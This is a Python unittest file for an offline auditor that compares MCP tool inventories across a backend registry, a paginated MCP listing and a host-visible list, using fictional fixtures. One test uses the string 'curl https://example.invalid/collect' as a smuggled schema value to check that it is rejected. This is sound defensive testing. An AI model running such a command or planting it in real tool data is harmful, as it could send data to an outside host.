"""Fictional, offline acceptance for MCP inventory visibility comparison.

No live server, session, identity, network, token, or agent host is exercised.
"""
import copy
import importlib.util
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[1]
SCRIPT = ROOT / "scripts" / "audit.py"
SPEC = importlib.util.spec_from_file_location("mcp_audit", SCRIPT)
audit = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(audit)

WHEN = "2026-11-22T20:00:00Z"
REV = "synthetic-rev-one"
CONTEXT = "fictional-principal-one"


def tool(name):
    return {"name": name, "inputSchema": {
        "type": "object", "properties": {"word": {"type": "string"}}}}


def sample():
    tools = [tool("alpha"), tool("beta"), tool("gamma")]
    base = {"source_revision": REV, "context_tag": CONTEXT,
            "captured_at": WHEN, "complete": True}
    return {"schema_version": 1, "protocol_revision": "2026-07-28",
            "source_revision": REV, "context_tag": CONTEXT,
            "stages": {
                "backend_registry": {**base, "tools": copy.deepcopy(tools)},
                "mcp_list": {**base, "pages": [{
                    "request_cursor": None, "next_cursor": None,
                    "ttlMs": 0, "cacheScope": "private",
                    "tools": copy.deepcopy(tools)}]},
                "host_visible": {**base, "tools": copy.deepcopy(tools)},
            }}


class MCPBoundaryTests(unittest.TestCase):
    def observed(self, value=None):
        return audit.audit(sample() if value is None else value)

    def hold(self, marker, obj):
        with self.assertRaisesRegex(audit.EvidenceHold, marker):
            audit.audit(obj)

    def test_three_complete_matching_stages_observed_parity(self):
        result = self.observed()
        self.assertEqual(result["status"], "OBSERVED_PARITY")
        self.assertEqual(result["counts"],
                         {"backend_registry": 3, "mcp_list": 3, "host_visible": 3})
        self.assertFalse(result["backend_revision_authenticated"])
        self.assertFalse(result["mcp_transport_observed"])
        self.assertFalse(result["host_behavior_independently_observed"])
        self.assertFalse(result["tool_invocations_tested"])

    def test_missing_host_tool_is_localized_to_mcp_host_boundary(self):
        data = sample()
        data["stages"]["host_visible"]["tools"].pop()
        result = self.observed(data)
        self.assertEqual(result["status"], "OBSERVED_DIFFERENCE")
        self.assertEqual(result["observed_differences"], [{
            "boundary": "mcp_list_to_host_visible",
            "finding": "NOT_VISIBLE_DOWNSTREAM", "name": "gamma"}])
        self.assertFalse(result["host_or_server_fault_assigned"])

    def test_backend_only_tool_localized_to_backend_mcp_boundary(self):
        data = sample()
        data["stages"]["mcp_list"]["pages"][0]["tools"].pop()
        data["stages"]["host_visible"]["tools"].pop()
        result = self.observed(data)
        self.assertEqual(result["observed_differences"], [{
            "boundary": "backend_registry_to_mcp_list",
            "finding": "NOT_VISIBLE_DOWNSTREAM", "name": "gamma"}])

    def test_host_extra_tool_is_not_called_backend_fault(self):
        data = sample()
        data["stages"]["host_visible"]["tools"].append(tool("host_local"))
        result = self.observed(data)
        self.assertEqual(result["observed_differences"][0]["finding"],
                         "ONLY_VISIBLE_DOWNSTREAM")
        self.assertFalse(result["host_or_server_fault_assigned"])

    def test_different_schema_at_mcp_boundary_detected(self):
        data = sample()
        data["stages"]["mcp_list"]["pages"][0]["tools"][1]["inputSchema"]["properties"]["word"]["type"] = "number"
        data["stages"]["host_visible"]["tools"][1]["inputSchema"]["properties"]["word"]["type"] = "number"
        result = self.observed(data)
        self.assertEqual(len(result["observed_differences"]), 1)
        self.assertEqual(result["observed_differences"][0]["finding"],
                         "SCHEMA_FINGERPRINT_DIFF")
        self.assertEqual(len(result["observed_differences"][0]["upstream_sha256"]), 64)

    def test_schema_property_order_does_not_trigger_drift(self):
        data = sample()
        data["stages"]["host_visible"]["tools"][0]["inputSchema"] = {
            "properties": {"word": {"type": "string"}}, "type": "object"}
        self.assertEqual(self.observed(data)["status"], "OBSERVED_PARITY")

    def test_output_schema_mismatch_is_detected(self):
        data = sample()
        data["stages"]["host_visible"]["tools"][0]["outputSchema"] = {
            "type": "object", "properties": {"result": {"type": "integer"}}}
        self.assertEqual(self.observed(data)["observed_differences"][0]["finding"],
                         "SCHEMA_FINGERPRINT_DIFF")

    def test_duplicate_tool_names_refused(self):
        data = sample()
        data["stages"]["backend_registry"]["tools"].append(tool("alpha"))
        self.hold("duplicate tool name", data)

    def test_duplicate_across_mcp_pages_refused(self):
        data = sample()
        pages = data["stages"]["mcp_list"]["pages"]
        pages[0]["next_cursor"] = "page2"
        pages.append({"request_cursor": "page2", "next_cursor": None,
                      "ttlMs": 0, "cacheScope": "private",
                      "tools": [tool("alpha")]})
        self.hold("duplicate tool name", data)

    def test_complete_two_page_mcp_inventory_can_match(self):
        data = sample()
        pages = data["stages"]["mcp_list"]["pages"]
        last = pages[0]["tools"].pop()
        pages[0]["next_cursor"] = "page2"
        pages.append({"request_cursor": "page2", "next_cursor": None,
                      "ttlMs": 0, "cacheScope": "private", "tools": [last]})
        self.assertEqual(self.observed(data)["status"], "OBSERVED_PARITY")

    def test_unfetched_cursor_does_not_fabricate_missing_tools(self):
        data = sample()
        pages = data["stages"]["mcp_list"]["pages"]
        pages[0]["next_cursor"] = "more-unfetched"
        pages[0]["tools"].pop()
        result = self.observed(data)
        self.assertEqual(result["status"], "INCONCLUSIVE")
        self.assertIn("INCOMPLETE_MCP_PAGINATION", result["inconclusive_reasons"])
        self.assertEqual(result["observed_differences"], [])

    def test_wrong_page_cursor_refused(self):
        data = sample()
        pages = data["stages"]["mcp_list"]["pages"]
        pages[0]["next_cursor"] = "requested"
        pages.append({"request_cursor": "unexpected", "next_cursor": None,
                      "ttlMs": 0, "cacheScope": "private", "tools": []})
        self.hold("cursor chain mismatch", data)

    def test_cycle_in_pagination_refused(self):
        data = sample()
        pages = data["stages"]["mcp_list"]["pages"]
        pages[0]["next_cursor"] = "first"
        pages.append({"request_cursor": "first", "next_cursor": "first",
                      "ttlMs": 0, "cacheScope": "private", "tools": []})
        self.hold("cursor cycle", data)

    def test_unobserved_host_is_inconclusive_not_missing_all_tools(self):
        data = sample()
        del data["stages"]["host_visible"]
        result = self.observed(data)
        self.assertEqual(result["status"], "INCONCLUSIVE")
        self.assertIsNone(result["counts"]["host_visible"])
        self.assertEqual(result["observed_differences"], [])

    def test_unobserved_mcp_stage_is_inconclusive(self):
        data = sample()
        del data["stages"]["mcp_list"]
        self.assertEqual(self.observed(data)["status"], "INCONCLUSIVE")

    def test_backend_declared_incomplete_withholds_comparison(self):
        data = sample()
        data["stages"]["backend_registry"]["complete"] = False
        result = self.observed(data)
        self.assertIn("STAGE_DECLARED_INCOMPLETE:backend_registry",
                      result["inconclusive_reasons"])
        self.assertFalse(result["observed_differences"])

    def test_wrong_source_revision_does_not_assign_host_fault(self):
        data = sample()
        data["stages"]["host_visible"]["source_revision"] = "other-revision"
        result = self.observed(data)
        self.assertEqual(result["status"], "INCONCLUSIVE")
        self.assertIn("SOURCE_REVISION_DIFFERENCE:host_visible",
                      result["inconclusive_reasons"])

    def test_different_auth_context_blocks_comparison(self):
        data = sample()
        data["stages"]["mcp_list"]["context_tag"] = "different-principal"
        result = self.observed(data)
        self.assertEqual(result["status"], "INCONCLUSIVE")
        self.assertIn("AUTH_CONTEXT_DIFFERENCE:mcp_list",
                      result["inconclusive_reasons"])

    def test_capture_window_over_five_minutes_withholds_causality(self):
        data = sample()
        data["stages"]["host_visible"]["captured_at"] = "2026-11-22T20:15:00Z"
        result = self.observed(data)
        self.assertIn("CAPTURE_WINDOW_TOO_WIDE", result["inconclusive_reasons"])

    def test_timezone_unaware_timestamp_refused(self):
        data = sample()
        data["stages"]["host_visible"]["captured_at"] = "2026-11-22T20:00:00"
        self.hold("missing timezone", data)

    def test_modern_protocol_requires_cache_hints(self):
        data = sample()
        del data["stages"]["mcp_list"]["pages"][0]["ttlMs"]
        self.hold("cache hints missing", data)

    def test_legacy_protocol_allows_absent_cache_hints(self):
        data = sample()
        data["protocol_revision"] = "2025-11-25"
        del data["stages"]["mcp_list"]["pages"][0]["ttlMs"]
        del data["stages"]["mcp_list"]["pages"][0]["cacheScope"]
        self.assertEqual(self.observed(data)["status"], "OBSERVED_PARITY")

    def test_invalid_cache_scope_refused(self):
        data = sample()
        data["stages"]["mcp_list"]["pages"][0]["cacheScope"] = "global"
        self.hold("invalid cacheScope", data)

    def test_public_cache_scope_only_advisory_not_proven_leak(self):
        data = sample()
        data["stages"]["mcp_list"]["pages"][0]["cacheScope"] = "public"
        result = self.observed(data)
        self.assertEqual(result["status"], "OBSERVED_PARITY")
        self.assertEqual(result["advisories"],
                         ["REVIEW_PUBLIC_CACHE_SCOPE_FOR_AUTH_DEPENDENCE"])

    def test_boolean_ttl_is_invalid_not_integer(self):
        data = sample()
        data["stages"]["mcp_list"]["pages"][0]["ttlMs"] = True
        self.hold("invalid ttlMs", data)

    def test_stage_unknown_fields_fail_closed(self):
        data = sample()
        data["stages"]["host_visible"]["execute_tool"] = True
        self.hold("unexpected fields", data)

    def test_schema_cannot_be_command_text(self):
        data = sample()
        data["stages"]["host_visible"]["tools"][0]["inputSchema"] = (
            "curl https://example.invalid/collect")
        self.hold("inputSchema must be a JSON object", data)

    def test_nonfinite_JSON_and_duplicate_keys_rejected(self):
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "observation.json"
            path.write_text('{"a":1,"a":2}', encoding="utf8")
            with self.assertRaisesRegex(audit.EvidenceHold, "duplicate JSON key"):
                audit.load(path)
            path.write_text('{"value":NaN}', encoding="utf8")
            with self.assertRaisesRegex(audit.EvidenceHold, "nonfinite JSON"):
                audit.load(path)

    def test_symlink_input_refused(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            target = root / "original.json"
            target.write_text(json.dumps(sample()), encoding="utf8")
            link = root / "alias.json"
            try:
                link.symlink_to(target)
            except (OSError, NotImplementedError):
                self.skipTest("no symlink support")
            with self.assertRaisesRegex(audit.EvidenceHold, "symlinked"):
                audit.load(link)

    def test_oversized_input_refused(self):
        with tempfile.TemporaryDirectory() as td:
            path = Path(td) / "large.json"
            path.write_bytes(b"x" * (audit.MAX_BYTES + 1))
            with self.assertRaisesRegex(audit.EvidenceHold, "one MiB"):
                audit.load(path)

    def test_cli_nonwriting_and_require_parity_gates(self):
        with tempfile.TemporaryDirectory() as td:
            file = Path(td) / "observed.json"
            file.write_text(json.dumps(sample()), encoding="utf8")
            base = [sys.executable, str(SCRIPT), "--input", str(file)]
            passing = subprocess.run(base + ["--require-parity"],
                                     capture_output=True, text=True)
            self.assertEqual(passing.returncode, 0, passing.stderr)
            self.assertEqual(json.loads(passing.stdout)["status"],
                             "OBSERVED_PARITY")
            bad = sample()
            bad["stages"]["host_visible"]["tools"].pop()
            file.write_text(json.dumps(bad), encoding="utf8")
            difference = subprocess.run(base + ["--require-parity"],
                                        capture_output=True, text=True)
            self.assertEqual(difference.returncode, 3, difference.stderr)
            self.assertEqual(json.loads(difference.stdout)["status"],
                             "OBSERVED_DIFFERENCE")

    def test_18_server_12_host_synthetic_demo(self):
        data = sample()
        tools = [tool("tool_%02d" % i) for i in range(1, 19)]
        data["stages"]["backend_registry"]["tools"] = copy.deepcopy(tools)
        data["stages"]["mcp_list"]["pages"][0]["tools"] = copy.deepcopy(tools)
        data["stages"]["host_visible"]["tools"] = copy.deepcopy(tools[:12])
        result = self.observed(data)
        self.assertEqual(result["counts"]["backend_registry"], 18)
        self.assertEqual(result["counts"]["host_visible"], 12)
        self.assertEqual(len(result["observed_differences"]), 6)
        self.assertEqual({x["boundary"] for x in result["observed_differences"]},
                         {"mcp_list_to_host_visible"})
        self.assertFalse(result["host_or_server_fault_assigned"])

    def test_fixture_is_fiction_not_observed_host_behavior(self):
        demo = audit.load(ROOT / "examples" / "synthetic-18-versus-12.json")
        result = self.observed(demo)
        self.assertEqual(result["status"], "OBSERVED_DIFFERENCE")
        self.assertFalse(result["host_behavior_independently_observed"])
        self.assertEqual(len(result["observed_differences"]), 6)


if __name__ == "__main__":
    unittest.main()
